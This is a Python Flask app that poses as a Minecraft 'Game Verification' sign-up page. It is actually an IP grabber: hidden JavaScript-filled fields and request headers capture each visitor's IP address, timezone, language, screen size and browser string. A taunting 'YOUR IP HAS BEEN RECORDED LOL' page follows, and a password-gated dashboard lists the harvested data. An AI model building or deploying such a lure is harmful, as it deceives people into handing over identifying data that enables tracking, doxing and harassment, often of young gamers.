from flask import Flask, request, render_template_string, session, redirect, url_for
import datetime
import os

app = Flask(__name__)
app.secret_key = "no-api-intel-key"

ADMIN_PASSWORD = "your-password"
recorded_ips = []

# --- HTML TEMPLATES ---

VERIFY_HTML = """
<!DOCTYPE html>
<html>
<head><title>Game Verification</title><style>
    body { background: #1a1a1a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .box { background: #333; padding: 30px; border-radius: 8px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
    input { padding: 10px; width: 220px; border: none; border-radius: 4px; margin-bottom: 10px; font-size: 16px; }
    button { padding: 10px 20px; background: #52a054; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
</style></head>
<body>
    <div class="box">
        <h2>Game Sign Up</h2>
        <p style="color: #bbb;">Enter your username to sign up.</p>
        <form method="POST">
            <input type="text" name="mc_name" placeholder="Minecraft Username, Nickname, etc..." required autofocus>
            <input type="hidden" name="timezone" id="tz">
            <input type="hidden" name="screen" id="sc">
            <input type="hidden" name="lang" id="lang">
            <br><button type="submit">Verify & Connect</button>
        </form>
    </div>
    <script>
        document.getElementById('tz').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
        document.getElementById('sc').value = window.screen.width + "x" + window.screen.height;
        document.getElementById('lang').value = navigator.language || navigator.userLanguage;
    </script>
</body>
</html>
"""

CAUGHT_HTML = """
<!DOCTYPE html>
<html>
<head><style>
    body { background: #000; color: #ff0000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Arial Black'; text-align: center; overflow: hidden; }
    h1 { font-size: 6vw; text-transform: uppercase; animation: blinker 0.6s linear infinite; }
    @keyframes blinker { 50% { opacity: 0; } }
</style></head>
<body><h1>YOUR IP HAS BEEN RECORDED LOL</h1></body>
</html>
"""

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head><title>Internal Intel</title><style>
    body { font-family: sans-serif; background: #f4f4f4; padding: 20px; }
    table { width: 100%; border-collapse: collapse; background: white; font-size: 13px; }
    th, td { padding: 10px; border: 1px solid #ddd; text-align: left; }
    th { background: #333; color: white; }
    .badge { background: #eee; padding: 2px 5px; border-radius: 3px; font-size: 11px; }
</style></head>
<body>
    <div style="display: flex; justify-content: space-between; align-items: center;">
        <h1>No-API Intelligence Logs</h1>
        <form action="/clear" method="POST"><button style="background:red; color:white; border:none; padding:10px; cursor:pointer;">CLEAR ALL</button></form>
    </div>
    <table>
        <tr>
            <th>User</th>
            <th>IP Address</th>
            <th>Browser Timezone</th>
            <th>System Lang</th>
            <th>Device/Browser</th>
            <th>Screen</th>
        </tr>
        {% for e in logs %}
        <tr>
            <td><strong>{{ e.name }}</strong></td>
            <td><code>{{ e.ip }}</code></td>
            <td><strong>{{ e.tz }}</strong></td>
            <td><span class="badge">{{ e.lang }}</span></td>
            <td><small>{{ e.ua }}</small></td>
            <td>{{ e.screen }}</td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
"""

# --- ROUTES ---

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        # Grab everything from the form (populated by JS)
        name = request.form.get('mc_name', 'Unknown')
        tz = request.form.get('timezone', 'Unknown')
        screen = request.form.get('screen', 'Unknown')
        lang = request.form.get('lang', 'Unknown')
        
        # Railway IP handling
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        ua = request.headers.get('User-Agent', 'Unknown')
        
        recorded_ips.append({
            "name": name, "ip": ip, "tz": tz, 
            "lang": lang, "ua": ua, "screen": screen
        })
        
        return render_template_string(CAUGHT_HTML)
        
    return render_template_string(VERIFY_HTML)

@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
    if not session.get('logged_in'):
        return '<form method="POST">Pass: <input type="password" name="password"><input type="submit"></form>'
    return render_template_string(DASHBOARD_HTML, logs=recorded_ips[::-1])

@app.route('/clear', methods=['POST'])
def clear_logs():
    if session.get('logged_in'): recorded_ips.clear()
    return redirect(url_for('dashboard'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
